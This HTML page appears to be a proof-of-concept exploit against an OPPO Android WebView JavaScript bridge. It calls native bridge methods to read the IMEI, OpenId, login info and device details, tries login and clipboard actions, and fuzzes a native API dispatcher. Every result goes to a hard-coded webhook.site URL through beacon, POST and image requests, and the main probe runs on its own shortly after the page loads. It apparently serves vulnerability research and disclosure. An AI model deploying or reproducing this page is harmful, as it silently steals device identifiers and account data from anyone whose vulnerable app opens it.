<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge RAW Sensitive Probe v3</title>
  <style>
    body { font-family: sans-serif; padding: 24px; background:#000; color:#eee; }
    pre { background: #f3f3f3; color:#111; padding: 16px; white-space: pre-wrap; word-break: break-word; }
    .warn { color: #ff3355; font-weight: bold; }
    button { padding: 10px 16px; margin: 8px 8px 8px 0; }
  </style>
</head>
<body>
<h1>OPPO WebBridge RAW Sensitive Probe v3</h1>
<p class="warn">
  RAW mode: full returned values are displayed locally and also sent to the configured researcher webhook.
</p>

<button onclick="runFullRawProbe('manual_raw_button')">Run RAW sensitive probe</button>
<button onclick="tryStartLogin('manual_start_login_button')">Try doStartLogin</button>
<button onclick="tryClipboardMarker('manual_clipboard_button')">Try clipboard marker</button>
<button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Try indirect callNativeApi/callAsyncNativeApi</button>
<button onclick="tryDispatcherReadonly('manual_dispatcher_readonly_button')">Try dispatcher readonly account APIs</button>

<p id="status">WAITING</p>
<pre id="out"></pre>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";
  const RAW_TO_WEBHOOK = true;

  const RAW_METHODS = [
    "getImei",
    "getOpenId",
    "getLoginInfo",
    "isLogin",
    "getChannelId",
    "getPackageName",
    "getDeviceModel",
    "getNetworkType",
    "getRomVersion",
    "getRomVersionCode",
    "getStatusBarHeight",
    "isInstalled",
    "isSupportShake",
    "getProgress",
    "getButtonStatus"
  ];

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch (e) {
      try { return String(x); } catch (_) { return "[unstringifiable]"; }
    }
  }

  function describeAndroidObject() {
    const a = window.android;
    if (!a || typeof a !== "object") return { exists: false, type: typeof a };

    let ownKeys = [];
    let functionKeys = [];
    try {
      ownKeys = Object.getOwnPropertyNames(a).slice(0, 160);
      functionKeys = ownKeys.filter(k => {
        try { return typeof a[k] === "function"; } catch (e) { return false; }
      });
    } catch (e) {}

    return {
      exists: true,
      type: typeof a,
      tag: Object.prototype.toString.call(a),
      ownKeys,
      functionKeys
    };
  }

  function callBridge(method, args) {
    const a = window.android;
    const item = {
      method,
      args: args || [],
      exists: false,
      ok: false,
      returnType: null,
      rawReturnValue: null,
      empty: null,
      error: null
    };

    try {
      if (!a || typeof a !== "object") {
        item.error = "window.android missing";
        return item;
      }

      item.exists = typeof a[method] === "function";
      if (!item.exists) {
        item.error = "missing_or_not_function";
        return item;
      }

      const ret = a[method].apply(a, args || []);
      const raw = safeString(ret);

      item.ok = true;
      item.returnType = typeof ret;
      item.rawReturnValue = raw;
      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
      return item;
    } catch (e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function basePayload(eventType, reason) {
    return {
      eventType,
      version: "raw_sensitive_v3",
      ts: new Date().toISOString(),
      reason,
      safetyBoundary: {
        rawSensitiveValuesDisplayedOnDevice: true,
        rawSensitiveValuesSentToWebhook: RAW_TO_WEBHOOK,
        testingDevice: "researcher_owned_device"
      },
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        webdriver: navigator.webdriver
      },
      androidBridge: describeAndroidObject()
    };
  }

  function sendWebhook(payload) {
    const json = JSON.stringify(payload);

    try {
      navigator.sendBeacon(
        WEBHOOK + "/oppo-sensitive-raw-beacon",
        new Blob([json], { type: "text/plain" })
      );
    } catch (e) {}

    try {
      fetch(WEBHOOK + "/oppo-sensitive-raw-post", {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "text/plain" },
        body: json
      }).catch(function(){});
    } catch (e) {}

    try {
      const encoded = encodeURIComponent(json).slice(0, 7500);
      new Image().src =
        WEBHOOK +
        "/oppo-sensitive-raw-get?event=" +
        encodeURIComponent(payload.eventType) +
        "&t=" + Date.now() +
        "&d=" + encoded;
    } catch (e) {}
  }

  function renderAndSend(payload) {
    document.getElementById("status").textContent =
      payload.eventType + ": " + payload.ts;

    document.getElementById("out").textContent =
      JSON.stringify(payload, null, 2);

    sendWebhook(payload);
  }

  window.runFullRawProbe = function(reason) {
    const payload = basePayload("OPPO_SENSITIVE_RAW_RESULT", reason);
    payload.results = RAW_METHODS.map(m => callBridge(m, []));
    renderAndSend(payload);
  };

  window.tryStartLogin = function(reason) {
    const payload = basePayload("OPPO_START_LOGIN_RESULT", reason);
    payload.result = callBridge("doStartLogin", []);
    payload.note = "If a login/account UI is opened by attacker-controlled web content, this is a high-value native-action sink even if no raw ID is returned.";
    renderAndSend(payload);
  };

  window.tryClipboardMarker = function(reason) {
    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
    const payload = basePayload("OPPO_CLIPBOARD_MARKER_RESULT", reason);
    payload.marker = marker;
    payload.results = [
      callBridge("clipboardText", []),
      callBridge("clipboardText", [marker]),
      callBridge("clipboardText", [JSON.stringify({ text: marker })])
    ];
    renderAndSend(payload);
  };

  window.tryIndirectNativeApi = function(reason) {
    const payload = basePayload("OPPO_INDIRECT_NATIVE_API_RESULT", reason);
    const candidates = [
      ["callNativeApi", ["getImei"]],
      ["callNativeApi", ["getOpenId"]],
      ["callNativeApi", ["getLoginInfo"]],
      ["callNativeApi", [JSON.stringify({ method: "getImei" })]],
      ["callNativeApi", [JSON.stringify({ method: "getOpenId" })]],
      ["callNativeApi", [JSON.stringify({ method: "getLoginInfo" })]],
      ["callNativeApi", [JSON.stringify({ api: "getImei" })]],
      ["callNativeApi", [JSON.stringify({ api: "getOpenId" })]],
      ["callNativeApi", [JSON.stringify({ api: "getLoginInfo" })]],
      ["callAsyncNativeApi", ["getImei"]],
      ["callAsyncNativeApi", ["getOpenId"]],
      ["callAsyncNativeApi", ["getLoginInfo"]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getImei" })]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getOpenId" })]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getLoginInfo" })]]
    ];
    payload.results = candidates.map(c => callBridge(c[0], c[1]));
    renderAndSend(payload);
  };


  function sendDispatcherWebhook(payload) {
    const json = JSON.stringify(payload);

    try {
      navigator.sendBeacon(
        WEBHOOK + "/oppo-dispatcher-readonly-result",
        new Blob([json], { type: "text/plain" })
      );
    } catch (e) {}

    try {
      fetch(WEBHOOK + "/oppo-dispatcher-readonly-post", {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "text/plain" },
        body: json
      }).catch(function(){});
    } catch (e) {}

    try {
      const encoded = encodeURIComponent(json).slice(0, 7500);
      new Image().src =
        WEBHOOK +
        "/oppo-dispatcher-readonly-get?event=" +
        encodeURIComponent(payload.eventType) +
        "&t=" + Date.now() +
        "&d=" + encoded;
    } catch (e) {}
  }

  window.tryDispatcherReadonly = function(reason) {
    const payload = basePayload("OPPO_DISPATCHER_READONLY_RESULT", reason);

    const actions = [
      "account_islogin",
      "account_get_userid",
      "account_get_userinfo",
      "get_open_id",
      "get_imei",
      "get_channel_id",
      "get_package_name",
      "get_device_model",
      "get_network_type"
    ];

    const candidates = [];

    for (const actionName of actions) {
      candidates.push({ type: actionName });
      candidates.push({ action: actionName });
      candidates.push({ method: actionName });
      candidates.push({ name: actionName });
      candidates.push({ id: actionName });
      candidates.push({ type: actionName, data: {} });
      candidates.push({ action: actionName, data: {} });
      candidates.push({ method: actionName, data: {} });
      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, data: {} });
      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, data: {} });
      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, params: {} });
      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, params: {} });
    }

    payload.scope = {
      description: "Read-only dispatcher probe for account/device metadata actions only.",
      stateChangingActionsSkipped: [
        "account_start_login",
        "reLoginAccount",
        "download_open",
        "download_start",
        "download_pause",
        "download_cancel",
        "startPay",
        "openActivity",
        "openWebView"
      ],
      bridgeMethodsTested: ["callNativeApi", "callAsyncNativeApi"]
    };

    payload.candidateCount = candidates.length;
    payload.results = [];

    for (const candidate of candidates) {
      const arg = JSON.stringify(candidate);
      payload.results.push(callBridge("callNativeApi", [arg]));
      payload.results.push(callBridge("callAsyncNativeApi", [arg]));
    }

    document.getElementById("status").textContent =
      payload.eventType + ": " + payload.ts;

    document.getElementById("out").textContent =
      JSON.stringify(payload, null, 2);

    sendWebhook(payload);
    sendDispatcherWebhook(payload);
  };

  setTimeout(function () {
    runFullRawProbe("auto_after_load_1200ms");
  }, 1200);
})();
</script>
</body>
</html>
